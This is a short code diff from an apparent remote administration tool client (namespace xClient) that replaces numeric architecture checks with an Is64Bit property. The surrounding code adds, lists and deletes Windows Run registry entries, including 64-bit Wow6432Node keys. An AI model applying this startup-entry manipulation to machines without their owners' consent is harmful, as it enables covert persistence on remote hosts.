@@ -137,7 +137,7 @@ namespace xClient.Core.Commands
                         startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "3" + formattedKeyValue));
                     }
                 }
-                if (PlatformHelper.Architecture == 64)
+                if (PlatformHelper.Is64Bit)
                 {
                     using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                     {
@@ -206,7 +206,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 4:
-                        if (PlatformHelper.Architecture != 64)
+                        if (!PlatformHelper.Is64Bit)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
@@ -216,7 +216,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 5:
-                        if (PlatformHelper.Architecture != 64)
+                        if (!PlatformHelper.Is64Bit)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
@@ -286,7 +286,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 4:
-                        if (PlatformHelper.Architecture != 64)
+                        if (!PlatformHelper.Is64Bit)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
@@ -296,7 +296,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 5:
-                        if (PlatformHelper.Architecture != 64)
+                        if (!PlatformHelper.Is64Bit)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
